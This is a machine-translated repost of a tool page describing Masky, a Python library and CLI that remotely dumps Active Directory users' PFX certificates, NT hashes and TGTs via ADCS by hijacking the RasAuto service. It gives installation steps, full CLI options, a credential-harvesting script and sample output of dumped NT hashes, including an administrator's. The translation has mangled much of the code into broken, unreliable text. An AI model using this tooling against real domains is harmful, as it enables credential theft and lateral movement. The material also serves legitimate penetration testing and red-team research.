# Masky:带 CLI 的 Python 库，允许通过 ADCS 远程转储域用户凭证

> 原文：<https://kalilinuxtutorials.com/masky/>

[![](img/64f90137c2a94a9a5b7535ad2008215e.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi613ZRJi8M2dKw6VGvbn4P7TjfU9GiDsiM-WGtecg3AWHtJfklXdvAPtTFNGwSKEuQrXRW4zQjaTQNT3bZy6nFOSz-2sxe8uHxso5ar00gSzQADKFw68yYgGxQw_chr_uKIWUSL74Dl5f-NDvOToMN-Wqdp45YXO9UThShzn1m4u8DMZiVQ3rhUl4Y/s728/download.png)

Masky 是一个 python 库，借助 ADCS，它提供了一种远程转储域用户凭证的替代方法。在这个库的基础上构建了一个命令行工具，以便在更大的范围内轻松收集 PFX、NT 散列和 TGT。

该工具不利用任何新的漏洞，并且不通过转储 LSASS 进程内存来工作。事实上，它只利用了合法的 Windows 和 Active Directory 特性(令牌模拟、通过 kerberos 的证书认证和通过 PKINIT 的 NT 哈希检索)。发布了一篇博客文章，详细介绍了实现的技术以及 Masky 的工作原理。

Masky 源代码很大程度上基于令人惊叹的 Certify 和 Certipy 工具。我真的很感谢他们的作者对攻击性开发技术对 ADCS 的研究(见。确认部分)。

## 安装

Masky python3 库及其相关的 CLI 可以通过公共 PyPi 库简单地安装，如下所示:

**pip 安装屏蔽**

PyPi 包中已经包含了 Masky 代理可执行文件。

此外，如果需要修改代理，可以通过位于`**agent/Masky.sln**`中的 Visual Studio 项目重新编译 C#代码。这需要建造`**.NET Framework 4**`。

## 用法

Masky 被设计成一个 Python 库。此外，在它的基础上创建了一个命令行界面，以便在 pentest 或 RedTeam 活动中使用它。

对于这两种用法，您首先需要检索通过 ADCS 部署的`**CA server**`及其`**CA name**`的 FQDN。这些信息可以通过`**certipy find**`选项或微软内置的`c**ertutil.ex**e`工具轻松检索。确保在目标 CA 上启用了默认的`**User**`模板。

警告:Masky 通过修改现有的`RasAuto`服务在每个目标上部署一个可执行文件。尽管自动回滚其初始`**ImagePath**`值，Masky 运行时期间的意外错误可能会跳过清理阶段。因此，不要忘记手动重置原始值，以防意外停机。

### 命令行

下面的演示通过针对 4 个远程系统显示了 Masky 的基本用法。它的执行允许从 sec.lab 测试域中收集 3 个不同域用户的 NT 散列、CCACHE 和 PFX。

Masky 还提供了此类工具通常提供的选项(线程号、身份验证模式、从文件加载的目标等)。).

***_ _*_
| \/|*_**| |*_
| | \/|/*`/_*|//|
| | |(*| _*\<|*|*|*| _*，*|*/*| *| v0.0.3 |* /
用法:Masky[-H][-v][-ts][-t THREADS][-d DOMAIN][-u USER][-p PASSWORD][-k][-H HASHES][-DC-ip IP address]-ca CERTIFICATE _ AUTHORITY[-NH][-nt][-NP][-o OUTPUT]
[Targets…]
位置参数:
Targets CIDR 的目标，接受主机名和 IP 格式，来自 a –时间戳显示每个日志的时间戳
-t 线程，–THREADS THREADS
thread pool size(max 15)
认证:
-d 域，–DOMAIN DOMAIN
域名认证到
-u 用户，–USER 用户名认证到
-p 密码，–PASSWORD PASSWORD
密码认证到
-k，–kerberos 使用 Kerberos 认证。 根据目标参数从 ccache 文件(KRB5CCNAME)中获取凭据。
-H HASHES，–HASHES HASHES
要验证的 HASHES(LM:NT，:NT 或:LM)
连接:
-dc-ip ip 地址域控制器的 ip 地址。如果省略，它将使用目标参数中指定的域部分(FQDN)
-CA CERTIFICATE _ AUTHORITY，–CERTIFICATE-AUTHORITY CERTIFICATE _ AUTHORITY
证书颁发机构名称(SERVER\CA_NAME)
结果:
-nh，–no-hash 不请求 NT 哈希
-nt，–no-ccache 不保存 ccache 文件
-np，–no-pfx 不保存 pfx 文件
-o OUTPUT，–OUTPUT 输出
本地路径***

### Python 库

下面是一个简单的脚本，使用 Masky 库从远程目标收集运行域用户会话的秘密。

**from Masky import Masky
from get pass import get pass
def dump _ nt _ hashes():
定义认证参数
CA = " SRV-01 . sec . lab \ sec-SRV-01-CA "
DC _ IP = " 192 . 168 . 23 . 148 "
domain = " sec . lab "
user = " asky walker "
password = get pass()
用 password=password)
设置一个目标并对其运行 Masky
target = " 192 . 168 . 23 . 130 "
rslts = m . run(target)
检查 Masky 是否成功劫持了至少一个用户会话
或者是否发生了意外错误
如果没有 rslts:
在 MaskyResult 对象上返回 False
循环以显示被劫持的用户并从主机名检索他们的 NT 散列
print(f)结果**

它的执行生成以下输出。

**蟒 3。\masky_demo.py
密码:
结果来自主机名:SRV-01
–sec \ hsolo–05 ff 4 b 2d 523 BC 5 c 21 e 195 e 9851 e 2 b 157
–sec \ asky walker–8928 e 0723012 a 8471 c 0084149 C4 e 23 b 1
–sec \ administrator–4 f1 c6b 554 bb 79 e 2e ce 91 e 012 ffbe 6988 a【T6**

Masky 成功执行后，返回一个包含一系列`**User**`对象的`**MaskyResults**`对象。

请看`**masky\lib\results.py**`模块，检查这两个类提供的方法和属性。

[Download](https://github.com/Z4kSec/Masky)